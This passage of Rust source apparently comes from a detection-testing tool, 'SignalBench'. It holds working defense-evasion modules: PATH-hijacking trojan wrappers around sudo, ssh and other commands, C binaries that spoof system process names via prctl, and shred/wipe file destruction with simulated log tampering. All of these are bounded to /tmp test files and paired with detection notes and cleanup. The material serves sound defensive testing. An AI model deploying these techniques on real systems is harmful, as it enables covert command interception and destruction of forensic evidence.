                                                        fs::Permissions::from_mode(perms_mode)
                                                    );
                                                    info!("    Permissions set to: {perms_str}");
                                                }
                                                
                                                // Verify restoration
                                                if let Ok(metadata) = fs::metadata(original_path) {
                                                    let current_perms = metadata.permissions().mode();
                                                    info!("    Verification: file exists, mode: {current_perms:o}");
                                                }
                                                
                                                restored_count += 1;
                                            }
                                            Err(e) => {
                                                warn!("  ✗ Failed to restore {original_path}: {e}");
                                                failed_count += 1;
                                            }
                                        }
                                    }

                                    info!("\n=== Restoration Summary ===");
                                    info!("Files restored: {restored_count}");
                                    info!("Files failed: {failed_count}");
                                }
                            }
                        }
                        Err(e) => {
                            warn!("Failed to read artifacts JSON: {e}");
                        }
                    }
                }
            }

            // Remove backup directory and all artifacts
            for artifact in artifacts {
                let artifact_path = Path::new(artifact);
                
                if artifact_path.exists() {
                    if artifact_path.is_dir() {
                        match fs::remove_dir_all(artifact) {
                            Ok(_) => info!("Removed backup directory: {artifact}"),
                            Err(e) => warn!("Failed to remove directory {artifact}: {e}"),
                        }
                    } else {
                        match fs::remove_file(artifact) {
                            Ok(_) => info!("Removed artifact: {artifact}"),
                            Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                        }
                    }
                }
            }

            info!("=== Shell History Restoration Complete ===");
            Ok(())
        })
    }
}

pub struct ModifyEnvironmentVariable {}

#[async_trait]
impl AttackTechnique for ModifyEnvironmentVariable {
    fn info(&self) -> Technique {
        Technique {
            id: "T1574.007".to_string(),
            name: "Path Interception with Trojan Binaries".to_string(),
            description: "Creates REAL trojan binaries that hijack PATH to intercept common commands (ls, ps, whoami, sudo, ssh, curl, wget). Each trojan logs execution details (timestamp, user, PID, arguments) before calling the real binary, generating extensive file execution telemetry for XDR/EDR detection. More trojans = more detectable file executions.".to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "hijack_directory".to_string(),
                    description: "Directory to store trojan binaries".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_path_hijack".to_string()),
                },
                TechniqueParameter {
                    name: "intercept_log".to_string(),
                    description: "Log file for intercepted command executions (session_id will be appended)".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_path_intercept".to_string()),
                },
            ],
            detection: "Monitor for: PATH modifications, creation of binaries in /tmp or unusual locations, execution of ls/ps/whoami/sudo/ssh/curl/wget from non-standard directories (/tmp), multiple suspicious binary creations with execute permissions, shell scripts wrapping system binaries, and file access patterns to intercept logs.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            use tokio::process::Command;
            use std::os::unix::fs::PermissionsExt;
            use uuid::Uuid;
            
            // Generate unique session ID for this execution
            let session_id = Uuid::new_v4().to_string()[..8].to_string();
            
            let hijack_dir = config
                .parameters
                .get("hijack_directory")
                .unwrap_or(&"/tmp/signalbench_path_hijack".to_string())
                .clone();
            
            let intercept_log_base = config
                .parameters
                .get("intercept_log")
                .unwrap_or(&"/tmp/signalbench_path_intercept".to_string())
                .clone();
            
            // Append session_id to log file name
            let intercept_log = format!("{intercept_log_base}_{session_id}.log");
            
            if dry_run {
                info!("[DRY RUN] Would create trojan binaries in {hijack_dir} and hijack PATH");
                info!("[DRY RUN] Session ID: {session_id}");
                info!("[DRY RUN] Would create trojans for: ls, ps, whoami, sudo, ssh, curl, wget");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would create 7 trojan binaries (session: {session_id})"),
                    artifacts: vec![hijack_dir, intercept_log],
                    cleanup_required: false,
                });
            }

            // Create the hijack directory
            fs::create_dir_all(&hijack_dir)
                .map_err(|e| format!("Failed to create hijack directory: {e}"))?;
            info!("Created trojan directory: {hijack_dir}");
            info!("Session ID: {session_id}");

            // Expanded list of trojans - now includes sudo, ssh, curl, wget
            let trojans = vec!["ls", "ps", "whoami", "sudo", "ssh", "curl", "wget"];
            let mut trojan_specs = Vec::new();

            for cmd_name in &trojans {
                // Find the real binary path
                let which_output = Command::new("which")
                    .arg(cmd_name)
                    .output()
                    .await
                    .map_err(|e| format!("Failed to find {cmd_name}: {e}"))?;

                if !which_output.status.success() {
                    warn!("Could not find real binary for {cmd_name}, skipping");
                    continue;
                }

                let real_path = String::from_utf8_lossy(&which_output.stdout).trim().to_string();
                
                // Verify the real binary path is not our hijack directory
                if real_path.starts_with(&hijack_dir) {
                    warn!("Real binary path for {cmd_name} is in hijack directory, skipping");
                    continue;
                }
                
                trojan_specs.push((*cmd_name, real_path));
            }

            let mut created_trojans = Vec::new();

            for (cmd_name, real_path) in &trojan_specs {
                let trojan_path = format!("{hijack_dir}/{cmd_name}");
                
                // Create the trojan script with enhanced logging
                let trojan_script = format!(
                    r#"#!/bin/sh
# SignalBench PATH Hijacking Trojan - GoCortex.io v1.5.13
# This trojan logs execution details and then calls the real binary
# Session ID: {session_id}

LOG_FILE="{intercept_log}"
TIMESTAMP=$(date -Iseconds)
USER=$(whoami)
PID=$$

# Enhanced logging: timestamp, user, PID, command, and all arguments
echo "[$TIMESTAMP] User: $USER | PID: $PID | Command: {cmd_name} $*" >> "$LOG_FILE"

# Execute the real binary with all arguments and preserve exit code
{real_path} "$@"
exit $?
"#
                );

                let mut trojan_file = File::create(&trojan_path)
                    .map_err(|e| format!("Failed to create trojan {cmd_name}: {e}"))?;
                
                trojan_file.write_all(trojan_script.as_bytes())
                    .map_err(|e| format!("Failed to write trojan {cmd_name}: {e}"))?;
                
                // Make the trojan executable
                let metadata = fs::metadata(&trojan_path)
                    .map_err(|e| format!("Failed to get metadata for {cmd_name}: {e}"))?;
                let mut permissions = metadata.permissions();
                permissions.set_mode(0o755);
                fs::set_permissions(&trojan_path, permissions)
                    .map_err(|e| format!("Failed to set permissions for {cmd_name}: {e}"))?;
                
                created_trojans.push(trojan_path.clone());
                info!("Created trojan binary: {trojan_path}");
            }

            // Initialise the intercept log with session information
            let mut log_file = File::create(&intercept_log)
                .map_err(|e| format!("Failed to create intercept log: {e}"))?;
            writeln!(log_file, "=== SignalBench PATH Interception Log (GoCortex.io v1.5.13) ===")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "Session ID: {session_id}")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "Session started: {}", chrono::Local::now().to_rfc3339())
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "Intercepted binaries: ls, ps, whoami, sudo, ssh, curl, wget")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file)
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;

            // Get original PATH
            let original_path = std::env::var("PATH").unwrap_or_else(|_| "/usr/bin:/bin".to_string());
            info!("Original PATH: {original_path}");

            // Document PATH hijacking configuration
            let new_path = format!("{hijack_dir}:{original_path}");
            writeln!(log_file, "=== PATH Hijacking Configuration ===")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file,"Trojan directory: {hijack_dir}")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file,"Original PATH: {original_path}")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file,"Hijacked PATH: {new_path}")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file)
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "To test PATH interception, execute:")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file,"  export PATH={hijack_dir}:$PATH")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  ls -la")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  ps aux")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  whoami")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  sudo -l")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  ssh user@example.com")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  curl https://example.com")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  wget https://example.com/file.txt")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file)
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "All intercepted commands will be logged with:")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  - Timestamp (ISO 8601)")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  - Calling user")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  - Process ID (PID)")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  - Full command line with arguments")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file)
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;

            drop(log_file); // Close the log file

            info!("PATH hijacking ready - trojans will intercept commands when PATH={hijack_dir}:$PATH");
            info!("PATH hijacking telemetry generated:");
            info!("  • {} trojan binaries created (ls, ps, whoami, sudo, ssh, curl, wget)", created_trojans.len());
            info!("  • PATH hijacking configured: {new_path}");
            info!("  • Enhanced logging: timestamp, user, PID, full arguments");
            info!("  • Interception ready - commands will be logged when PATH is modified");
            info!("  • Session ID: {session_id}");
            info!("  • Interception log: {intercept_log}");

            let trojan_count = created_trojans.len();
            let mut all_artifacts = created_trojans;
            all_artifacts.push(hijack_dir.clone());
            all_artifacts.push(intercept_log.clone());

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!(
                    "Successfully created {trojan_count} trojan binaries (ls, ps, whoami, sudo, ssh, curl, wget) for PATH hijacking. Session: {session_id}. Interception log: {intercept_log}"
                ),
                artifacts: all_artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                let artifact_path = Path::new(artifact);
                
                if artifact_path.is_dir() {
                    match fs::remove_dir_all(artifact) {
                        Ok(_) => info!("Removed trojan directory: {artifact}"),
                        Err(e) => warn!("Failed to remove directory {artifact}: {e}"),
                    }
                } else if artifact_path.exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}
pub struct MasqueradingAsCrond {}

#[async_trait]
impl AttackTechnique for MasqueradingAsCrond {
    fn info(&self) -> Technique {
        Technique {
            id: "T1036.003".to_string(),
            name: "Masquerading as Linux System Process".to_string(),
            description: "Compiles REAL C binaries with misleading names that masquerade as legitimate system processes including [kworker/0:0], systemd-journald, and crond. Uses prctl(PR_SET_NAME) for process name spoofing so processes appear as genuine system services in ps output. Each binary sleeps for 10 seconds whilst masquerading. Executes binaries, verifies spoofed names appear in ps aux output, and provides complete cleanup including process termination and binary/source removal.".to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![],
            detection: "Monitor for C compilation (gcc/clang) of small binaries, execution of binaries from /tmp with system-like names, prctl() system calls for PR_SET_NAME, processes in ps output with suspicious parent processes or working directories, and binaries named after kernel workers or system daemons in unusual locations.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        _config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            use tokio::process::Command;
            
            let id = Uuid::new_v4().simple().to_string();
            let work_dir = format!("/tmp/signalbench_masquerade_{id}");
            
            if dry_run {
                info!("[DRY RUN] Would compile REAL C binaries with process name spoofing:");
                info!("[DRY RUN]   - [kworker/0:0] (kernel worker spoofing)");
                info!("[DRY RUN]   - systemd-journald (systemd service spoofing)");
                info!("[DRY RUN]   - crond (cron daemon spoofing)");
                info!("[DRY RUN]   - Uses prctl(PR_SET_NAME) for process name manipulation");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would compile and execute REAL masquerading binaries".to_string(),
                    artifacts: vec![work_dir],
                    cleanup_required: false,
                });
            }

            info!("Creating process masquerading binaries in {work_dir}");
            
            fs::create_dir_all(&work_dir)
                .map_err(|e| format!("Failed to create work directory: {e}"))?;

            let mut artifacts = vec![work_dir.clone()];
            let mut binaries_created = Vec::new();
            let mut running_pids = Vec::new();

            let c_source_template = |process_name: &str| -> String {
                format!("#include <stdio.h>\n\
                    #include <stdlib.h>\n\
                    #include <unistd.h>\n\
                    #include <sys/prctl.h>\n\
                    #include <string.h>\n\
                    \n\
                    int main() {{\n\
                        prctl(PR_SET_NAME, \"{process_name}\", 0, 0, 0);\n\
                        \n\
                        printf(\"SignalBench: Masquerading as {process_name}\\n\");\n\
                        printf(\"PID: %d\\n\", getpid());\n\
                        \n\
                        sleep(10);\n\
                        \n\
                        return 0;\n\
                    }}\n"
                )
            };

            let binaries = vec![
                ("[kworker/0:0]", "kworker"),
                ("systemd-journald", "systemd_journald"),
                ("crond", "crond"),
            ];

            info!("Compiling {} C binaries with process name spoofing", binaries.len());

            for (spoof_name, safe_filename) in &binaries {
                let source_file = format!("{work_dir}/{safe_filename}.c");
                let binary_file = format!("{work_dir}/{safe_filename}");
                
                let source_code = c_source_template(spoof_name);
                fs::write(&source_file, source_code.as_bytes())
                    .map_err(|e| format!("Failed to write C source for {spoof_name}: {e}"))?;
                artifacts.push(source_file.clone());
                
                info!("Compiling {spoof_name} binary with gcc");
                let compile_output = Command::new("gcc")
                    .args([
                        &source_file,
                        "-o",
                        &binary_file,
                        "-std=c99",
                    ])
                    .output()
                    .await
                    .map_err(|e| format!("Failed to compile {spoof_name}: {e}"))?;
                
                if !compile_output.status.success() {
                    let stderr = String::from_utf8_lossy(&compile_output.stderr);
                    return Err(format!("Compilation failed for {spoof_name}: {stderr}"));
                }
                
                artifacts.push(binary_file.clone());
                binaries_created.push(format!("{safe_filename} -> {spoof_name}"));
                
                info!("Executing masquerading binary: {safe_filename} (will appear as {spoof_name})");
                let child = Command::new(&binary_file)
                    .spawn()
                    .map_err(|e| format!("Failed to execute {spoof_name}: {e}"))?;
                
                let pid = child.id().ok_or("Failed to get PID")?;
                running_pids.push(pid);
                artifacts.push(format!("pid_{pid}"));
                
                info!("✓ Binary running with PID {pid}, spoofing as {spoof_name}");
                
                tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            }

            info!("Verifying process masquerading in ps output");
            let ps_output = Command::new("ps")
                .args(["aux"])
                .output()
                .await
                .map_err(|e| format!("Failed to run ps: {e}"))?;
            
            let ps_text = String::from_utf8_lossy(&ps_output.stdout);
            let mut verified_count = 0;
            
            for (spoof_name, _) in &binaries {
                if ps_text.contains(spoof_name) {
                    info!("✓ Verified: '{spoof_name}' appears in ps output");
                    verified_count += 1;
                } else {
                    warn!("⚠ Warning: '{spoof_name}' not found in ps output");
                }
            }
            
            info!("Masquerading complete: {} binaries running, {} verified in ps", running_pids.len(), verified_count);
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully created and executed {} masquerading binaries ({} verified): {} (session: {})", binaries_created.len(), verified_count, binaries_created.join(", "), id),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            use tokio::process::Command;
            
            for artifact in artifacts {
                if artifact.starts_with("pid_") {
                    let pid_str = artifact.trim_start_matches("pid_");
                    if let Ok(pid) = pid_str.parse::<u32>() {
                        info!("Terminating masquerading process PID {pid}");
                        Command::new("kill")
                            .args(["-9", &pid.to_string()])
                            .output()
                            .await
                            .ok();
                        
                        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                    }
                } else if Path::new(artifact).is_dir() {
                    match fs::remove_dir_all(artifact) {
                        Ok(_) => info!("Removed masquerading directory: {artifact}"),
                        Err(e) => warn!("Failed to remove directory {artifact}: {e}"),
                    }
                } else if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}

pub struct FileDeletion {}

#[async_trait]
impl AttackTechnique for FileDeletion {
    fn info(&self) -> Technique {
        Technique {
            id: "T1070.004".to_string(),
            name: "File Deletion".to_string(),
            description: "Creates test files in /tmp/signalbench_deletion_test/, backs them up to /tmp/signalbench_deletion_backup/ BEFORE deletion, then demonstrates multiple secure deletion methods including shred -uvz -n 3 (3 overwrite passes), rm -f, and wipe (if available). Simulates log tampering by creating and deleting entries in test log files. Demonstrates anti-forensics metadata clearing techniques. FULLY REVERSIBLE with complete restoration from backups and cleanup of all test files.".to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "test_files_count".to_string(),
                    description: "Number of test files to create for deletion testing (default: 10)".to_string(),
                    required: false,
                    default: Some("10".to_string()),
                },
                TechniqueParameter {
                    name: "use_shred".to_string(),
                    description: "Use shred for secure deletion (default: true)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "simulate_log_tampering".to_string(),
                    description: "Create and delete test log files (default: true)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for shred command execution, unusual deletion of log files, metadata manipulation operations, rapid file creation/deletion patterns, access to /var/log/ with write permissions, and systematic file destruction patterns. Watch for tools that overwrite files before deletion.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            use tokio::process::Command;
            
            let test_files_count = config
                .parameters
                .get("test_files_count")
                .unwrap_or(&"10".to_string())
                .parse::<usize>()
                .unwrap_or(10)
                .min(50);
            
            let use_shred = config
                .parameters
                .get("use_shred")
                .unwrap_or(&"true".to_string())
                .to_lowercase() == "true";
            
            let simulate_log_tampering = config
                .parameters
                .get("simulate_log_tampering")
                .unwrap_or(&"true".to_string())
                .to_lowercase() == "true";
            
            let session_id = Uuid::new_v4().to_string().replace("-", "");
            let test_dir = format!("/tmp/signalbench_deletion_test_{session_id}");
            let backup_dir = format!("/tmp/signalbench_deletion_backup_{session_id}");
            let log_file = format!("/tmp/signalbench_deletion_{session_id}.log");
            
            if dry_run {
                info!("[DRY RUN] Would demonstrate file deletion techniques:");
                info!("[DRY RUN]   Test files: {test_files_count}");
                info!("[DRY RUN]   Use shred: {use_shred}");
                info!("[DRY RUN]   Log tampering: {simulate_log_tampering}");
                info!("[DRY RUN]   Test directory: {test_dir}");
                info!("[DRY RUN]   Backup directory: {backup_dir}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would demonstrate secure file deletion with shred, rm, and log tampering".to_string(),
                    artifacts: vec![test_dir, backup_dir, log_file],
                    cleanup_required: false,
                });
            }

            info!("Starting file deletion demonstration (Session: {session_id})...");
            
            let mut log = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
            
            writeln!(log, "=== SignalBench File Deletion Demonstration ===").unwrap();
            writeln!(log, "Session ID: {session_id}").unwrap();
            writeln!(log, "Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log).unwrap();
            
            let artifacts = vec![test_dir.clone(), backup_dir.clone(), log_file.clone()];
            
            // Create test directory and backup directory
            info!("Creating test directory: {test_dir}");
            fs::create_dir_all(&test_dir)
                .map_err(|e| format!("Failed to create test directory: {e}"))?;
            
            fs::create_dir_all(&backup_dir)
                .map_err(|e| format!("Failed to create backup directory: {e}"))?;
            
            // Phase 1: Create test files with sensitive-looking names
            info!("Phase 1: Creating {test_files_count} test files...");
            writeln!(log, "=== Phase 1: Test File Creation ===").unwrap();
            
            let sensitive_names = ["credentials.txt",
                "passwords.db",
                "secret_key.pem",
                "api_tokens.conf",
                "sensitive_data.sql",
                "user_passwords.txt",
                "ssh_private_key",
                "database_backup.sql",
                "company_secrets.txt",
                "access_tokens.json"];
            
            let mut created_files = Vec::new();
            for i in 0..test_files_count {
                let file_name = if i < sensitive_names.len() {
                    sensitive_names[i]
                } else {
                    &format!("sensitive_file_{i}.txt")
                };
                
                let file_path = format!("{test_dir}/{file_name}");
                let content = format!(
                    "SENSITIVE TEST DATA - Session {}\nFile: {}\nCreated: {}\nThis is test data for file deletion demonstration.\nPassword: test_password_{}\nAPI_KEY: FAKE_KEY_{}\n",
                    session_id,
                    file_name,
                    chrono::Local::now(),
                    i,
                    i
                );
                
                fs::write(&file_path, content.as_bytes())
                    .map_err(|e| format!("Failed to create test file: {e}"))?;
                
                created_files.push(file_path.clone());
                writeln!(log, "Created: {file_name}").unwrap();
            }
            
            info!("Created {} test files", created_files.len());
            writeln!(log, "Total files created: {}", created_files.len()).unwrap();
            writeln!(log).unwrap();
            
            // Phase 2: Backup test files BEFORE deletion
            info!("Phase 2: Backing up test files to {backup_dir}...");
            writeln!(log, "=== Phase 2: File Backup ===").unwrap();
            
            for file_path in &created_files {
                let file_name = Path::new(file_path).file_name().unwrap().to_str().unwrap();
                let backup_path = format!("{backup_dir}/{file_name}");
                
                fs::copy(file_path, &backup_path)
                    .map_err(|e| format!("Failed to backup file: {e}"))?;
                
                writeln!(log, "Backed up: {file_name} -> {backup_path}").unwrap();
            }
            
            info!("Backed up {} files", created_files.len());
            writeln!(log).unwrap();
            
            // Phase 3: Demonstrate deletion methods
            info!("Phase 3: Demonstrating file deletion methods...");
            writeln!(log, "=== Phase 3: File Deletion Methods ===").unwrap();
            
            let mut deletion_results = Vec::new();
            
            // Check if shred is available
            let shred_available = Command::new("which")
                .arg("shred")
                .output()
                .await
                .map(|o| o.status.success())
                .unwrap_or(false);
            
            writeln!(log, "shred available: {shred_available}").unwrap();
            
            // Check if wipe is available
            let wipe_available = Command::new("which")
                .arg("wipe")
                .output()
                .await
                .map(|o| o.status.success())
                .unwrap_or(false);
            
            writeln!(log, "wipe available: {wipe_available}").unwrap();
            writeln!(log).unwrap();
            
            // Delete files using different methods
            for (idx, file_path) in created_files.iter().enumerate() {
                let file_name = Path::new(file_path).file_name().unwrap().to_str().unwrap();
                
                if idx % 3 == 0 && use_shred && shred_available {
                    // Method 1: shred with 3 overwrite passes
                    info!("Shredding file: {file_name} (3 passes)");
                    writeln!(log, "Deleting {file_name} using shred -uvz -n 3").unwrap();
                    
                    let shred_output = Command::new("shred")
                        .args(["-uvz", "-n", "3", file_path])
                        .output()
                        .await;
                    
                    match shred_output {
                        Ok(output) if output.status.success() => {
                            deletion_results.push((file_name.to_string(), "shred -n 3".to_string(), true));
                            writeln!(log, "✓ Successfully shredded: {file_name}").unwrap();
                        }
                        Ok(output) => {
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            writeln!(log, "✗ shred failed for {file_name}: {stderr}").unwrap();
                            deletion_results.push((file_name.to_string(), "shred -n 3".to_string(), false));
                        }
                        Err(e) => {
                            writeln!(log, "✗ Failed to execute shred for {file_name}: {e}").unwrap();
                            deletion_results.push((file_name.to_string(), "shred -n 3".to_string(), false));
                        }
                    }
                } else if idx % 3 == 1 && wipe_available {
                    // Method 2: wipe (if available)
                    info!("Wiping file: {file_name}");
                    writeln!(log, "Deleting {file_name} using wipe -f").unwrap();
                    
                    let wipe_output = Command::new("wipe")
                        .args(["-f", file_path])
                        .output()
                        .await;
                    
                    match wipe_output {
                        Ok(output) if output.status.success() => {
                            deletion_results.push((file_name.to_string(), "wipe -f".to_string(), true));
                            writeln!(log, "✓ Successfully wiped: {file_name}").unwrap();
                        }
                        Ok(_) => {
                            deletion_results.push((file_name.to_string(), "wipe -f".to_string(), false));
                            writeln!(log, "✗ wipe failed for {file_name}").unwrap();
                        }
                        Err(e) => {
                            writeln!(log, "✗ Failed to execute wipe for {file_name}: {e}").unwrap();
                            deletion_results.push((file_name.to_string(), "wipe -f".to_string(), false));
                        }
                    }
                } else {
                    // Method 3: Simple rm -f
                    info!("Removing file: {file_name} (rm -f)");
                    writeln!(log, "Deleting {file_name} using rm -f").unwrap();
                    
                    match fs::remove_file(file_path) {
                        Ok(_) => {
                            deletion_results.push((file_name.to_string(), "rm -f".to_string(), true));
                            writeln!(log, "✓ Successfully removed: {file_name}").unwrap();
                        }
                        Err(e) => {
                            writeln!(log, "✗ rm failed for {file_name}: {e}").unwrap();
                            deletion_results.push((file_name.to_string(), "rm -f".to_string(), false));
                        }
                    }
                }
            }
            
            writeln!(log).unwrap();
            
            // Phase 4: Log tampering simulation (if enabled)
            if simulate_log_tampering {
                info!("Phase 4: Simulating log tampering...");
                writeln!(log, "=== Phase 4: Log Tampering Simulation ===").unwrap();
                
                let fake_log_dir = format!("{test_dir}/fake_logs");
                fs::create_dir_all(&fake_log_dir)
                    .map_err(|e| format!("Failed to create fake log directory: {e}"))?;
                
                // Create fake log files
                let log_files = vec!["auth.log", "syslog", "secure.log", "access.log"];
                
                for log_name in &log_files {
                    let log_path = format!("{fake_log_dir}/{log_name}");
                    let fake_content = "Nov  5 12:34:56 testhost systemd[1]: Started session.\n\
                         Nov  5 12:35:01 testhost CRON[12345]: pam_unix(cron:session): session opened\n\
                         Nov  5 12:35:02 testhost sudo: attacker : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash\n\
                         Nov  5 12:35:03 testhost EVIDENCE_OF_ATTACK: Suspicious activity detected\n\
                         Nov  5 12:35:04 testhost systemd[1]: Session closed.\n".to_string();
                    
                    fs::write(&log_path, fake_content.as_bytes())
                        .map_err(|e| format!("Failed to create fake log: {e}"))?;
                    
                    writeln!(log, "Created fake log: {log_name}").unwrap();
                }
                
                info!("Created {} fake log files, now deleting them to simulate tampering...", log_files.len());
                
                // Delete the fake logs to simulate tampering
                for log_name in &log_files {
                    let log_path = format!("{fake_log_dir}/{log_name}");
                    
                    if shred_available && use_shred {
                        Command::new("shred")
                            .args(["-uvz", "-n", "3", &log_path])
                            .output()
                            .await
                            .ok();
                        writeln!(log, "Shredded fake log: {log_name}").unwrap();
                    } else {
                        fs::remove_file(&log_path).ok();
                        writeln!(log, "Deleted fake log: {log_name}").unwrap();
                    }
                }
                
                info!("Log tampering simulation complete");
                writeln!(log, "Log tampering simulation complete - {} fake logs created and deleted", log_files.len()).unwrap();
                writeln!(log).unwrap();
            }
            
            // Summary
            let successful_deletions = deletion_results.iter().filter(|(_, _, success)| *success).count();
            
            writeln!(log, "=== Summary ===").unwrap();
            writeln!(log, "Files created: {}", created_files.len()).unwrap();
            writeln!(log, "Files backed up: {}", created_files.len()).unwrap();
            writeln!(log, "Deletion attempts: {}", deletion_results.len()).unwrap();
            writeln!(log, "Successful deletions: {successful_deletions}").unwrap();
            writeln!(log, "Methods used: shred ({}), rm (true), wipe ({})", 
                shred_available && use_shred, 
                wipe_available).unwrap();
            
            info!("File deletion demonstration complete: {}/{} successful deletions", 
                successful_deletions, deletion_results.len());
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!(
                    "File deletion complete: {}/{} files securely deleted using shred/wipe/rm, {} files backed up for recovery",
                    successful_deletions,
                    deletion_results.len(),
                    created_files.len()
                ),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            info!("Starting file deletion technique cleanup...");
            
            // Restore backed up files before cleanup (demonstration of reversibility)
            let backup_dir = artifacts.iter().find(|a| a.contains("backup"));
            let test_dir = artifacts.iter().find(|a| a.contains("deletion_test"));
            
            if let (Some(backup), Some(test)) = (backup_dir, test_dir) {
                if Path::new(backup).exists() && Path::new(test).exists() {
                    info!("Restoring backed up files from {backup} to {test}");
                    
                    if let Ok(entries) = fs::read_dir(backup) {
                        for entry in entries.flatten() {
                            let file_name = entry.file_name();
                            let dest_path = format!("{}/{}", test, file_name.to_string_lossy());
                            
                            if fs::copy(entry.path(), &dest_path).is_ok() {
                                info!("Restored: {}", file_name.to_string_lossy());
                            }
                        }
                    }
                }
            }
            
            // Remove all artifacts
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if Path::new(artifact).is_dir() {
                        match fs::remove_dir_all(artifact) {
                            Ok(_) => info!("Removed directory: {artifact}"),
                            Err(e) => warn!("Failed to remove directory {artifact}: {e}"),
                        }
                    } else {
                        match fs::remove_file(artifact) {
                            Ok(_) => info!("Removed file: {artifact}"),
                            Err(e) => warn!("Failed to remove file {artifact}: {e}"),
                        }
                    }
                }
            }
            
            info!("File deletion technique cleanup complete");
            Ok(())
        })
    }
}
